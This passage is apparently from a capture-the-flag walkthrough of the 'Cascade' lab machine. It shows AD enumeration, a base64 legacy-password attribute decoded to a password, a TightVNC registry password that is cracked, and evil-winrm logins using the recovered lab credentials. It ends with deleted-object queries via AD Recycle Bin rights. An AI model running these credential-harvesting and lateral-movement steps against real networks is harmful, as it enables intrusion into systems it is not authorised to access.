concatenation (.) or string at ./enum4linux.pl line 574. Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users Group 'Users' (RID: 545) has member: CASCADE\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542. [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44e] group:[IT] rid:[0x459] group:[Production] rid:[0x45a] group:[HR] rid:[0x45b] group:[AD Recycle Bin] rid:[0x45f] group:[Backup] rid:[0x460] group:[Temps] rid:[0x463] group:[WinRMRemoteWMIUsers__] rid:[0x465] group:[Remote Management Users] rid:[0x466] group:[Factory] rid:[0x46c] group:[Finance] rid:[0x46d] group:[Audit Share] rid:[0x471] group:[Data Share] rid:[0x472] [+] Getting local group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'HR' (RID: 1115) has member: CASCADE\s.hickson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'IT' (RID: 1113) has member: CASCADE\arksvc Group 'IT' (RID: 1113) has member: CASCADE\s.smith Group 'IT' (RID: 1113) has member: CASCADE\r.thompson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593. [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[DnsUpdateProxy] rid:[0x44f] [+] Getting domain group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Domain Users' (RID: 513) has member: CASCADE\administrator Group 'Domain Users' (RID: 513) has member: CASCADE\krbtgt Group 'Domain Users' (RID: 513) has member: CASCADE\arksvc Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson Group 'Domain Users' (RID: 513) has member: CASCADE\util Group 'Domain Users' (RID: 513) has member: CASCADE\j.wakefield Group 'Domain Users' (RID: 513) has member: CASCADE\s.hickson Group 'Domain Users' (RID: 513) has member: CASCADE\j.goodhand Group 'Domain Users' (RID: 513) has member: CASCADE\a.turnbull Group 'Domain Users' (RID: 513) has member: CASCADE\e.crowe Group 'Domain Users' (RID: 513) has member: CASCADE\b.hanson Group 'Domain Users' (RID: 513) has member: CASCADE\d.burman Group 'Domain Users' (RID: 513) has member: CASCADE\BackupSvc Group 'Domain Users' (RID: 513) has member: CASCADE\j.allen Group 'Domain Users' (RID: 513) has member: CASCADE\i.croft Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Domain Guests' (RID: 514) has member: CASCADE\CascGuest Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\administrator Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Using Ldap Search— Intresting findings from ldapsearch dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Ryan Thompson sn: Thompson givenName: Ryan distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local instanceType: 4 whenCreated: 20200109193126.0Z whenChanged: 20200323112031.0Z displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 name: Ryan Thompson objectGUID:: LfpD6qngUkupEy9bFXBBjA== userAccountControl: 66048 badPwdCount: 8 codePage: 0 countryCode: 0 badPasswordTime: 132299219591809760 lastLogoff: 0 lastLogon: 132299203623153712 pwdLastSet: 132230718862636251 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA== accountExpires: 9223372036854775807 logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200126183918.0Z dSCorePropagationData: 20200119174753.0Z dSCorePropagationData: 20200119174719.0Z dSCorePropagationData: 20200119174508.0Z dSCorePropagationData: 16010101000000.0Z lastLogonTimestamp: 132294360317419816 msDS-SupportedEncryptionTypes: 0 This seems more intresting.. cascadeLegacyPwd: clk0bjVldmE= Decoding with the base64 echo &quot;clk0bjVldmE=&quot; | base64 -d rY4n5eva Using smbclient for further more enumeration! smbclient -L cascade.htb -U r.thompson Enter WORKGROUP\r.thompson's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Audit$ Disk C$ Disk Default share Data Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share print$ Disk Printer Drivers SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available Some more intresting findings! smbclient //cascade.htb/Data -U r.thompson Enter WORKGROUP\r.thompson's password: Try &quot;help&quot; to get a list of possible commands. smb: \&gt; ls . D 0 Sun Jan 26 22:27:34 2020 .. D 0 Sun Jan 26 22:27:34 2020 Contractors D 0 Sun Jan 12 20:45:11 2020 Finance D 0 Sun Jan 12 20:45:06 2020 IT D 0 Tue Jan 28 13:04:51 2020 Production D 0 Sun Jan 12 20:45:18 2020 Temps D 0 Sun Jan 12 20:45:15 2020 13106687 blocks of size 4096. 7806882 blocks available smb: \&gt; cd It smb: \It\&gt; ls . D 0 Tue Jan 28 13:04:51 2020 .. D 0 Tue Jan 28 13:04:51 2020 Email Archives D 0 Tue Jan 28 13:00:30 2020 LogonAudit D 0 Tue Jan 28 13:04:40 2020 Logs D 0 Tue Jan 28 19:53:04 2020 Temp D 0 Tue Jan 28 17:06:59 2020 13106687 blocks of size 4096. 7806882 blocks available After moving into the dir Email Archives………. smb: \IT\Email Archives\&gt; ls . D 0 Tue Jan 28 13:04:51 2020 .. D 0 Tue Jan 28 13:04:51 2020 Meeting_Notes_June_2018.html A 2522 Tue Jan 28 13:04:51 2020 13106687 blocks of size 4096. 7793283 blocks available smb: \IT\Email Archives\&gt; get Meeting_Notes_June_2018.html getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec) cat Meeting_Notes_June_2018.html &lt;p&gt;-- New production network will be going live on Wednesday so keep an eye out for any issues. &lt;/p&gt; &lt;p&gt;-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt; &lt;p&gt;-- The winner of the �Best GPO� competition will be announced on Friday so get your submissions in soon.&lt;/p&gt; So from here I moved into the Temp folder and found a user S.Smith. smb: \IT\Temp\s.smith\&gt; ls . D 0 Wed Jan 29 05:00:01 2020 .. D 0 Wed Jan 29 05:00:01 2020 VNC Install.reg A 2680 Wed Jan 29 04:27:44 2020 13106687 blocks of size 4096. 7793278 blocks available Here there is a registery found VNC Install.reg. let’s see what’s inside that. cat VNC Install.reg ��Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC] [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server] &quot;ExtraPorts&quot;=&quot;&quot; &quot;QueryTimeout&quot;=dword:0000001e &quot;QueryAcceptOnTimeout&quot;=dword:00000000 &quot;LocalInputPriorityTimeout&quot;=dword:00000003 &quot;LocalInputPriority&quot;=dword:00000000 &quot;BlockRemoteInput&quot;=dword:00000000 &quot;BlockLocalInput&quot;=dword:00000000 &quot;IpAccessControl&quot;=&quot;&quot; &quot;RfbPort&quot;=dword:0000170c &quot;HttpPort&quot;=dword:000016a8 &quot;DisconnectAction&quot;=dword:00000000 &quot;AcceptRfbConnections&quot;=dword:00000001 &quot;UseVncAuthentication&quot;=dword:00000001 &quot;UseControlAuthentication&quot;=dword:00000000 &quot;RepeatControlAuthentication&quot;=dword:00000000 &quot;LoopbackOnly&quot;=dword:00000000 &quot;AcceptHttpConnections&quot;=dword:00000001 &quot;LogLevel&quot;=dword:00000000 &quot;EnableFileTransfers&quot;=dword:00000001 &quot;RemoveWallpaper&quot;=dword:00000001 &quot;UseD3D&quot;=dword:00000001 &quot;UseMirrorDriver&quot;=dword:00000001 &quot;EnableUrlParams&quot;=dword:00000001 &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f &quot;AlwaysShared&quot;=dword:00000000 &quot;NeverShared&quot;=dword:00000000 &quot;DisconnectClients&quot;=dword:00000001 &quot;PollingInterval&quot;=dword:000003e8 &quot;AllowLoopback&quot;=dword:00000000 &quot;VideoRecognitionInterval&quot;=dword:00000bb8 &quot;GrabTransparentWindows&quot;=dword:00000001 &quot;SaveLogToAllUsersPath&quot;=dword:00000000 &quot;RunControlInterface&quot;=dword:00000001 &quot;IdleTimeout&quot;=dword:00000000 &quot;VideoClasses&quot;=&quot;&quot; &quot;VideoRects&quot;=&quot;&quot; &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f after cracking the hex we get the password as sT333ve2 Login as S.Smith evil-winrm -i cascade.htb -u s.smith -p sT333ve2 Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\s.smith\Documents&gt; Getting User.txt *Evil-WinRM* PS C:\Users\s.smith\Documents&gt; cd .. *Evil-WinRM* PS C:\Users\s.smith&gt; cd Desktop *Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; type user.txt 36e**************************9e513 *Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; Privilege Escalaition Part 1: Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; whoami /all USER INFORMATION ---------------- User Name SID =============== ============================================== cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\Audit Share Alias S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled Nothing much in this.. Proceding with Dir enumeration. *Evil-WinRM* PS C:\&gt; cd Shares *Evil-WinRM* PS C:\Shares&gt; cd Audit *Evil-WinRM* PS C:\Shares\Audit&gt; ls Directory: C:\Shares\Audit Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/28/2020 9:40 PM DB d----- 1/26/2020 10:25 PM x64 d----- 1/26/2020 10:25 PM x86 -a---- 1/28/2020 9:46 PM 13312 CascAudit.exe -a---- 1/29/2020 6:00 PM 12288 CascCrypto.dll -a---- 1/28/2020 11:29 PM 45 RunAudit.bat -a---- 10/27/2019 6:38 AM 363520 System.Data.SQLite.dll -a---- 10/27/2019 6:38 AM 186880 System.Data.SQLite.EF6.dll -a---- 1/28/2020 9:46 PM 13312 CascAudit.exe -a---- 1/29/2020 6:00 PM 12288 CascCrypto.dll Found a couple of intresting files exe and dll. There was a folder DB and which contains Audit.db.. *Evil-WinRM* PS C:\Shares\Audit\DB&gt; ls Directory: C:\Shares\Audit\DB Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/28/2020 9:39 PM 24576 Audit.db Downloaded the Audit.db file and looking in the contents I found ArkSvcBQO5l5Kj9MdErXx6Q6AGOw== Having a look at both the other files that we have got CascAudit.exe and CascCrypto.dll using DNSPY. After all the REverse Engineering is done, the final output is the password of user ARK-SVC Login as Arksvc evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Privilege escalation part 2 *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /all USER INFORMATION ---------------- User Name SID ============== ============================================== cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled This thing seems very instresting!! CASCADE\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group Finding the Deleted Objects: *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; -IncludeDeletedObjects Deleted : True DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe Deleted : True DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local Name : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 ObjectClass : group ObjectGUID : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 Deleted : True DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Name : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ObjectClass : groupPolicyContainer ObjectGUID : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Deleted : True DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local Name : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 ObjectClass : container ObjectGUID : 93c23674-e411-400b-bb9f-c0340bda5a34 Deleted : True DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local Name : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 ObjectClass : container ObjectGUID : 746385f2-e3a0-4252-b83a-5a206da0ed88 Deleted : True DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 The below ones are intresting! Deleted : True DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 Gaining ROOT Access!! *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter 'isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;' -includeDeletedObjects -property * accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe CN : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe codePage : 0 countryCode : 0 Created : 1/9/2020 7:30:19 PM createTimeStamp : 1/9/2020 7:30:19 PM Deleted : True Description : DisplayName : DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM} instanceType : 4 isCriticalSystemObject : False isDeleted : True LastKnownParent : OU=Computers,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 localPolicyFlags : 0 logonCount : 0 Modified : 1/28/2020 6:08:35 PM modifyTimeStamp : 1/28/2020 6:08:35 PM msDS-LastKnownRDN : CASC-WS1 Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe objectSid : S-1-5-21-3332504370-1206983947-1165150453-1108 primaryGroupID : 515 ProtectedFromAccidentalDeletion : False pwdLastSet : 132230718192147073 sAMAccountName : CASC-WS1$ sDRightsEffective : 0 userAccountControl : 4128 uSNChanged : 245849 uSNCreated : 24603 whenChanged : 1/28/2020 6:08:35 PM whenCreated : 1/9/2020 7:30:19 PM CanonicalName : cascade.local/Deleted Objects/Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 CN : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 Created : 1/13/2020 5:21:53 PM createTimeStamp : 1/13/2020 5:21:53 PM Deleted : True Description : DisplayName : DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...} groupType : -2147483644 instanceType : 4 isDeleted : True LastKnownParent : OU=Groups,OU=UK,DC=cascade,DC=local Modified : 1/28/2020 6:07:55 PM modifyTimeStamp : 1/28/2020 6:07:55 PM msDS-LastKnownRDN : Scheduled Tasks Name : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : group ObjectGUID : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1131 ProtectedFromAccidentalDeletion : False sAMAccountName : Scheduled Tasks sDRightsEffective : 0 uSNChanged : 245848 uSNCreated : 114790 whenChanged : 1/28/2020 6:07:55 PM whenCreated : 1/13/2020 5:21:53 PM CanonicalName : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e CN : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Created : 1/26/2020 2:34:30 AM createTimeStamp : 1/26/2020 2:34:30 AM Deleted : True Description : DisplayName : Block Potato DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} flags : 0 gPCFileSysPath : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA} gPCFunctionalityVersion : 2 gPCMachineExtensionNames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}] instanceType : 4 isDeleted : True LastKnownParent : CN=Policies,CN=System,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : {A403B701-A528-4685-A816-FDEE32BDDCBA} Name : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : groupPolicyContainer ObjectGUID : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196701 uSNCreated : 196688 versionNumber : 2 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:30 AM CanonicalName : cascade.local/Deleted Objects/Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 CN : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 Created : 1/26/2020 2:34:31 AM createTimeStamp : 1/26/2020 2:34:31 AM Deleted : True Description : DisplayName : DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} instanceType : 4 isDeleted : True LastKnownParent : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : Machine Name : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : container ObjectGUID : 93c23674-e411-400b-bb9f-c0340bda5a34 ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196699 uSNCreated : 196689 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:31 AM CanonicalName : cascade.local/Deleted Objects/User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 CN : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 Created : 1/26/2020 2:34:31 AM createTimeStamp : 1/26/2020 2:34:31 AM Deleted : True Description : DisplayName : DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} instanceType : 4 isDeleted : True LastKnownParent : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : User Name : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : container ObjectGUID : 746385f2-e3a0-4252-b83a-5a206da0ed88 ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196700 uSNCreated : 196690 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:31 AM accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin 